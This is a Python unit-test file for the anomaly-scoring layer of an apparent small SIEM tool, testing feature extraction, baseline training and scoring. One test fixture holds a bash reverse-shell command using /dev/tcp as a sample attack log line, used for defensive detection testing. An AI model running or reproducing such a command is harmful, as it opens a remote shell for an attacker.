"""
test_ml.py — Unit tests for the ML anomaly scoring layer

Covers:
  - Feature extraction: dimension, bounds, correctness per category
  - Synthetic corpus generation
  - Model training and serialization
  - Scorer: load/train, score, XAI, enrichment, stats
  - Anomaly discrimination: clean vs injected attack events
"""

import asyncio
import os
import pytest
import tempfile
from datetime import datetime, timezone

from nano_siem.schema import NormalizedEvent
from nano_siem.ml.features import (
    extract, top_features, FEATURE_DIM, FEATURE_NAMES,
    _is_rfc1918, _port_bucket, _stable_hash,
)
from nano_siem.ml.baseline import (
    generate_clean_corpus, train, save, load, BaselineModel,
)
from nano_siem.ml.scorer import AnomalyScorer, ScoredEvent


# ── Helpers ────────────────────────────────────────────────────────────────────

def make_event(
    message: str = "test message",
    source_ip: str | None = "192.168.1.10",
    dest_port: int | None = 22,
    program: str = "sshd",
    severity: str = "info",
    facility: str = "auth",
    log_source: str = "syslog_rfc5424",
    hour: int = 10,
    tags: list[str] | None = None,
    pid: int | None = 1234,
) -> NormalizedEvent:
    e = NormalizedEvent()
    e.message = message
    e.raw = message
    e.source_ip = source_ip
    e.dest_port = dest_port
    e.program = program
    e.severity = severity
    e.facility = facility
    e.log_source = log_source
    e.timestamp = datetime(2026, 6, 2, hour, 30, 0, tzinfo=timezone.utc)
    e.tags = tags or []
    e.pid = pid
    return e


def run(coro):
    return asyncio.get_event_loop().run_until_complete(coro)


# ── Helper function tests ─────────────────────────────────────────────────────

class TestHelpers:
    def test_rfc1918_10(self):
        assert _is_rfc1918("10.0.0.1") is True
        assert _is_rfc1918("10.255.255.255") is True

    def test_rfc1918_172(self):
        assert _is_rfc1918("172.16.0.1") is True
        assert _is_rfc1918("172.31.255.255") is True
        assert _is_rfc1918("172.32.0.1") is False

    def test_rfc1918_192(self):
        assert _is_rfc1918("192.168.1.100") is True
        assert _is_rfc1918("192.169.1.1") is False

    def test_rfc1918_public(self):
        assert _is_rfc1918("8.8.8.8") is False
        assert _is_rfc1918("203.0.113.5") is False

    def test_rfc1918_malformed(self):
        assert _is_rfc1918("not.an.ip") is False
        assert _is_rfc1918("") is False

    def test_port_bucket_ranges(self):
        assert _port_bucket(80) == 0.1
        assert _port_bucket(443) == 0.2
        assert _port_bucket(3306) == 0.4
        assert _port_bucket(65000) == 0.9
        assert _port_bucket(0) == 0.0

    def test_stable_hash_deterministic(self):
        assert _stable_hash("sshd") == _stable_hash("sshd")
        assert _stable_hash("nginx") != _stable_hash("sshd")

    def test_stable_hash_bounds(self):
        for prog in ["sshd", "sudo", "nginx", "cron", "systemd", "x" * 100]:
            h = _stable_hash(prog)
            assert 0.0 <= h <= 1.0


# ── Feature extraction tests ──────────────────────────────────────────────────

class TestFeatureExtraction:
    def test_returns_correct_dimension(self):
        e = make_event()
        vec = extract(e)
        assert len(vec) == FEATURE_DIM
        assert FEATURE_DIM == 31

    def test_all_values_in_unit_interval(self):
        e = make_event()
        vec = extract(e)
        for i, v in enumerate(vec):
            assert 0.0 <= v <= 1.0, f"Feature {FEATURE_NAMES[i]}={v} out of [0,1]"

    def test_business_hours_feature(self):
        # hour=10, weekday (Monday June 2 2026 = Monday)
        e = make_event(hour=10)
        vec = extract(e)
        assert vec[4] == 1.0   # is_business_hours
        assert vec[3] == 0.0   # not off_hours

    def test_off_hours_feature(self):
        e = make_event(hour=2)
        vec = extract(e)
        assert vec[3] == 1.0   # is_off_hours
        assert vec[4] == 0.0   # not business_hours

    def test_has_source_ip(self):
        e_with = make_event(source_ip="10.0.0.1")
        e_without = make_event(source_ip=None)
        assert extract(e_with)[5] == 1.0
        assert extract(e_without)[5] == 0.0

    def test_rfc1918_detection(self):
        e_priv = make_event(source_ip="192.168.1.100")
        e_pub = make_event(source_ip="203.0.113.5")
        assert extract(e_priv)[7] == 1.0
        assert extract(e_pub)[7] == 0.0

    def test_dest_port_norm(self):
        e = make_event(dest_port=443)
        vec = extract(e)
        assert abs(vec[8] - 443/65535) < 0.001

    def test_common_port_feature(self):
        e_common = make_event(dest_port=22)
        e_uncommon = make_event(dest_port=4444)
        assert extract(e_common)[10] == 1.0
        assert extract(e_uncommon)[10] == 0.0

    def test_auth_program_feature(self):
        e_auth = make_event(program="sshd")
        e_other = make_event(program="nginx")
        assert extract(e_auth)[16] == 1.0
        assert extract(e_other)[16] == 0.0

    def test_network_program_feature(self):
        e_net = make_event(program="nginx")
        e_other = make_event(program="sshd")
        assert extract(e_net)[17] == 1.0
        assert extract(e_other)[17] == 0.0

    def test_message_length_norm(self):
        short_e = make_event(message="short")
        long_e = make_event(message="x" * 1024)
        assert extract(short_e)[20] < extract(long_e)[20]
        assert extract(long_e)[20] == 1.0   # capped at 1.0

    def test_failure_keyword_feature(self):
        e_fail = make_event(message="Failed password for root")
        e_ok = make_event(message="Accepted publickey for deploy")
        assert extract(e_fail)[22] == 1.0
        assert extract(e_ok)[22] == 0.0

    def test_success_keyword_feature(self):
        e_succ = make_event(message="Accepted password for deploy")
        e_fail = make_event(message="Failed password for root")
        assert extract(e_succ)[23] == 1.0
        assert extract(e_fail)[23] == 0.0

    def test_path_in_message(self):
        e_path = make_event(message="Executed /usr/bin/bash -c 'whoami'")
        e_nopath = make_event(message="session opened for user root")
        assert extract(e_path)[24] == 1.0
        assert extract(e_nopath)[24] == 0.0

    def test_severity_encoding(self):
        e_err = make_event(severity="err")
        e_info = make_event(severity="info")
        assert extract(e_err)[25] > extract(e_info)[25]
        assert extract(e_err)[28] == 1.0    # is_error_severity
        assert extract(e_info)[29] == 1.0   # is_info_severity

    def test_has_pid_feature(self):
        e_with = make_event(pid=1234)
        e_without = make_event(pid=None)
        assert extract(e_with)[19] == 1.0
        assert extract(e_without)[19] == 0.0

    def test_tag_count_norm(self):
        e_tagged = make_event(tags=["a", "b", "c", "d", "e"])
        e_untagged = make_event(tags=[])
        assert extract(e_tagged)[30] == 0.5
        assert extract(e_untagged)[30] == 0.0

    def test_no_source_ip_zeros_ip_features(self):
        e = make_event(source_ip=None)
        vec = extract(e)
        assert vec[5] == 0.0   # has_source_ip
        assert vec[6] == 0.0   # source_ip_octet1
        assert vec[7] == 0.0   # is_rfc1918

    def test_no_dest_port_zeros_port_features(self):
        e = make_event(dest_port=None)
        vec = extract(e)
        assert vec[8] == 0.0   # dest_port_norm
        assert vec[14] == 0.0  # has_dest_port

    def test_never_raises(self):
        """Feature extraction must never raise for any input."""
        e = NormalizedEvent()  # fully empty event
        vec = extract(e)
        assert len(vec) == FEATURE_DIM


# ── top_features / XAI tests ──────────────────────────────────────────────────

class TestTopFeatures:
    def test_returns_n_features(self):
        vec = [0.5] * FEATURE_DIM
        result = top_features(vec, n=5)
        assert len(result) == 5

    def test_returns_feature_names(self):
        vec = [0.5] * FEATURE_DIM
        result = top_features(vec, n=3)
        for name, _ in result:
            assert name in FEATURE_NAMES

    def test_deviation_from_baseline(self):
        baseline = [0.0] * FEATURE_DIM
        vec = [0.0] * FEATURE_DIM
        vec[0] = 1.0   # hour_of_day maxed out
        result = top_features(vec, baseline_vector=baseline, n=1)
        assert result[0][0] == "hour_of_day"

    def test_sorted_by_deviation_descending(self):
        baseline = [0.0] * FEATURE_DIM
        vec = [0.0] * FEATURE_DIM
        vec[0] = 0.9
        vec[1] = 0.5
        vec[2] = 0.1
        result = top_features(vec, baseline_vector=baseline, n=3)
        deviations = [v for _, v in result]
        assert deviations == sorted(deviations, reverse=True)


# ── Baseline training tests ───────────────────────────────────────────────────

class TestBaseline:
    def test_generate_clean_corpus(self):
        corpus = generate_clean_corpus(n_samples=100)
        assert len(corpus) == 100
        for e in corpus:
            assert isinstance(e, NormalizedEvent)
            assert e.message

    def test_corpus_is_reproducible(self):
        c1 = generate_clean_corpus(n_samples=50)
        c2 = generate_clean_corpus(n_samples=50)
        # Fixed seed → same messages
        messages1 = {e.message for e in c1}
        messages2 = {e.message for e in c2}
        assert messages1 == messages2

    def test_train_returns_model(self):
        events = generate_clean_corpus(n_samples=200)
        model = train(events)
        assert isinstance(model, BaselineModel)
        assert model.n_training_samples == 200
        assert len(model.baseline_vector) == FEATURE_DIM

    def test_train_empty_raises(self):
        with pytest.raises(ValueError, match="empty"):
            train([])

    def test_save_and_load(self, tmp_path):
        events = generate_clean_corpus(n_samples=200)
        model = train(events)
        path = str(tmp_path / "model.joblib")
        save(model, path)
        assert os.path.exists(path)
        loaded = load(path)
        assert loaded.n_training_samples == model.n_training_samples
        assert loaded.trained_at == model.trained_at

    def test_loaded_model_scores(self, tmp_path):
        events = generate_clean_corpus(n_samples=200)
        model = train(events)
        path = str(tmp_path / "model.joblib")
        save(model, path)
        loaded = load(path)
        e = make_event()
        score = loaded.predict_score(extract(e))
        assert 0.0 <= score <= 1.0

    def test_load_missing_raises(self):
        with pytest.raises(FileNotFoundError):
            load("/nonexistent/model.joblib")

    def test_baseline_vector_dimension(self):
        events = generate_clean_corpus(n_samples=200)
        model = train(events)
        assert len(model.baseline_vector) == FEATURE_DIM


# ── Scorer tests ──────────────────────────────────────────────────────────────

class TestScorer:
    def _make_scorer(self, tmp_path) -> AnomalyScorer:
        path = str(tmp_path / "model.joblib")
        scorer = AnomalyScorer(model_path=path, threshold=0.62, train_n_samples=300)
        run(scorer.load_or_train())
        return scorer

    def test_load_or_train_creates_model(self, tmp_path):
        scorer = self._make_scorer(tmp_path)
        assert scorer.is_loaded

    def test_score_returns_scored_event(self, tmp_path):
        scorer = self._make_scorer(tmp_path)
        e = make_event()
        result = scorer.score(e)
        assert isinstance(result, ScoredEvent)

    def test_score_in_unit_interval(self, tmp_path):
        scorer = self._make_scorer(tmp_path)
        e = make_event()
        result = scorer.score(e)
        assert 0.0 <= result.anomaly_score <= 1.0

    def test_score_enriches_event(self, tmp_path):
        scorer = self._make_scorer(tmp_path)
        e = make_event()
        result = scorer.score(e)
        assert e.anomaly_score == result.anomaly_score

    def test_anomalous_event_tagged(self, tmp_path):
        scorer = self._make_scorer(tmp_path)
        # Force an obviously anomalous event: off-hours, external IP, high port, failure
        e = make_event(
            hour=3, source_ip="203.0.113.99", dest_port=4444,
            program="unknown_proc", severity="emerg",
            message="Fatal: unauthorized access attempt detected uid=0 /bin/bash",
        )
        result = scorer.score(e)
        if result.is_anomalous:
            assert "ml:anomalous" in e.tags

    def test_xai_features_returned(self, tmp_path):
        scorer = self._make_scorer(tmp_path)
        e = make_event()
        result = scorer.score(e)
        assert len(result.top_features) == 5
        for name, val in result.top_features:
            assert name in FEATURE_NAMES
            assert val >= 0.0

    def test_stats_updated(self, tmp_path):
        scorer = self._make_scorer(tmp_path)
        scorer.score(make_event())
        scorer.score(make_event())
        s = scorer.get_stats()
        assert s["events_scored"] == 2
        assert 0.0 <= s["avg_score"] <= 1.0

    def test_score_before_load_returns_neutral(self):
        scorer = AnomalyScorer(model_path="/nonexistent/model.joblib")
        e = make_event()
        result = scorer.score(e)
        assert result.anomaly_score == 0.0
        assert result.is_anomalous is False

    def test_clean_events_score_lower_than_attack(self, tmp_path):
        """
        Clean internal-IP business-hours SSH login should score lower
        than an off-hours external-IP process-execution attack event.
        """
        scorer = self._make_scorer(tmp_path)

        clean = make_event(
            hour=10, source_ip="192.168.1.10", dest_port=22,
            program="sshd", severity="info",
            message="Accepted publickey for deploy from 192.168.1.10 port 54321",
        )
        attack = make_event(
            hour=2, source_ip="203.0.113.5", dest_port=31337,
            program="bash", severity="emerg",
            message="FATAL uid=0 /bin/bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
        )

        clean_result = scorer.score(clean)
        attack_result = scorer.score(attack)

        assert clean_result.anomaly_score < attack_result.anomaly_score, (
            f"Expected clean ({clean_result.anomaly_score:.3f}) < "
            f"attack ({attack_result.anomaly_score:.3f})"
        )

    def test_second_load_is_idempotent(self, tmp_path):
        path = str(tmp_path / "model.joblib")
        scorer = AnomalyScorer(model_path=path, train_n_samples=200)
        run(scorer.load_or_train())
        run(scorer.load_or_train())  # should not retrain
        assert scorer.get_stats()["training_samples"] == 200
